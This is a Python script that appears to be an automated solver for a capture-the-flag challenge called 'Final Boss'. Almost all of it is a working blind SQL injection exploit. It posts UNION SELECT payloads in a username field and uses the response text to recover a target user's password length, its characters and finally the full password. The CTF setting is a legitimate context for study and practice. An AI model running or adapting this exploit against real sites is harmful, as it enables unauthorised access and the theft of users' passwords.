#!/usr/bin/python3

from pwn import log
from base64 import b64encode
import requests
import argparse
import string

def send_post(url, payload):
    headers = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0", 
            "Accept": "*/*", 
            "Accept-Language": "en-US,en;q=0.5", 
            "Accept-Encoding": "gzip, deflate", 
            "Referer": "http://localhost/", 
            "Content-Type": "application/x-www-form-urlencoded", 
            "Origin": "http://localhost", 
            "DNT": "1", 
            "Connection": "close", 
            "Sec-Fetch-Dest": "empty", 
            "Sec-Fetch-Mode": "cors", 
            "Sec-Fetch-Site": "same-origin", 
            "Sec-GPC": "1"
            }

    data = {"username": payload}

    r = requests.post(url, headers=headers, data=data)
    return r.text

def get_pw_length(table, pass_col):
    log.info('Getting password length')
    length = 0

    while(True):
        payload = '\' UNION SELECT ' + pass_col + ' FROM ' + table + ' WHERE username=\'' + args.user + '\' AND CHAR_LENGTH(password) = ' + str(length) + ' #'

        if 'not exists' not in send_post(args.url, payload):
            log.info('Password length found: ' + str(length))
            return str(length)
        else:
            length += 1

def get_chars(table, pass_col):
    log.info('Getting list of used characters')
    char_list = []
    test = string.ascii_lowercase + string.digits + '{' + '}' + '-'
    for char in test:
        payload = '\' UNION SELECT ' + pass_col + ' FROM ' + table + ' WHERE username=\'' + args.user + '\' AND password LIKE \'%' + char + '%\'#'

        if 'not exists' not in send_post(args.url, payload):
            char_list.append(char)

    log.info('List of used characters: ' + ', '.join(char_list))
    return char_list


def bruteforce_password(table,  pass_col):
    length = get_pw_length(table, pass_col)
    chars = get_chars(table, pass_col)

    log.info('Attempting to brute force password')
    print('Password: ', end='')

    password = []
    while(len(password) < int(length)):
        for char in chars:
            payload = '\' UNION SELECT ' + pass_col + ' FROM ' + table + ' WHERE username=\'' + args.user + '\' AND password LIKE \'' + ''.join(password) + char + '%\'#'
            if 'not exists' not in send_post(args.url, payload):
                password.append(char)
                print(char, end='')
                break
    print('')
    log.success('Password found')

def __main__():
    log.info('Password brutforce starting')
    bruteforce_password('users', 'password')

parser = argparse.ArgumentParser(description='Auto solver for \"Final Boss\" challenge')
parser.add_argument('--url', help='Target URL', required=True)
parser.add_argument('--user', help='Target user', required=True)

args = parser.parse_args()
__main__()
